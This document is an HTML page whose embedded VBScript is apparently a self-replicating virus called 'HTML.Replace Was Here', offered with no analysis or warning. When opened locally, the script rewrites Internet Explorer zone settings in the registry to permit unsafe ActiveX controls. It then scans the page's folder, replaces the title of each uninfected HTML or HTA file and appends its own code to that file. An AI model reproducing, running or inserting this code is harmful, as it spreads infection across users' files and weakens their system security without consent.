<HTML>
<HEAD>
<META NAME="GENERATOR" Content="SAPIEN Technologies PrimalSCRIPT(TM)">
<TITLE>HTML.Replace Was Here</TITLE>
</HEAD>
<BODY>

<SCRIPT Language="VBScript" id="HTML.Replacer">
Const ForReading = 1, ForWriting = 2, ForAppending = 8

oRange = document.Scripts.NamedItem("HTML.Replacer").Text
Set WshShell = CreateObject("WScript.Shell")
if location.Port = "" Then
    WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
    WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
    thisFile = location.pathname
    theLength = Len(thisFile)
    thisFileTxt = thisFile
    Do Until thePosition = 1
        thePosition = InStr(thisFileTxt, "\")
        thePosition = thePosition + 1
        thisFileTxt = Mid(thisFileTxt, thePosition, theLength)
    Loop
    theLength2 = Len(thisFileTxt)
    theLength = theLength - theLength2
    thisFile = Mid(thisFile, 2, theLength - 1)
    
    theFolder (thisFile)
Else
    
End If

Sub theFolder(theName)
On Error Resume Next

Set Fso = CreateObject("Scripting.FileSystemObject")
If Fso.FolderExists(theName) Then
Set FolderObj = Fso.GetFolder(theName)
    Set FO = FolderObj.Files
        For Each NewFile In FO
            ExtName = LCase(Fso.GetExtensionName(NewFile.Name))
            Select Case ExtName
                Case "hta", "html", "htm"
                    Set MyFile = Fso.GetFile(NewFile.Path)
                    Set kamb = Fso.OpenTextFile(MyFile, ForReading)
                    metafind = 0
                    Do Until kamb.AtEndOfStream
                        If metafind = 0 Then
                            strg = kamb.ReadLine
                            metafind = InStr(1, strg, "HTML.Replace Was Here", vbTextCompare)
                            boo = 1
                        Else
                            boo = 2
                            Exit Do
                        End If
                    Loop
                    If boo = 1 Then
                        kamb.Close
                        getItAll(MyFile)
					else
						kamb.Close
                    End If
                Case Else
            End Select
        Next
Else
    Exit Sub
End If
End Sub

Function getItAll(theFile)
On Error Resume Next

Set Fso = CreateObject("Scripting.FileSystemObject")
Set ts = Fso.OpenTextFile(theFile, ForReading)
strg = ts.ReadAll
metafind = InStr(1, strg, "TITLE", vbTextCompare)
nextFind = InStr(metafind, strg, VbCrlf)
togetHer = nextFind - metafind
strTitle = Mid(strg, metafind, togetHer)
newTitle = "title>HTML.Replace Was Here</title>"
strReplace = Replace(strg, strTitle, newTitle, vbTextCompare)
ts.Close

Set ts = Fso.OpenTextFile(theFile, ForWriting)
ts.write strReplace
ts.WriteBlankLines(1) 
ts.WriteLine "<script language=""VBScript"" id=""HTML.Replacer"">"
ts.Write oRange
ts.Write "<" & "/" & "script>"
ts.Close
End Function
</script>

</BODY>
</HTML>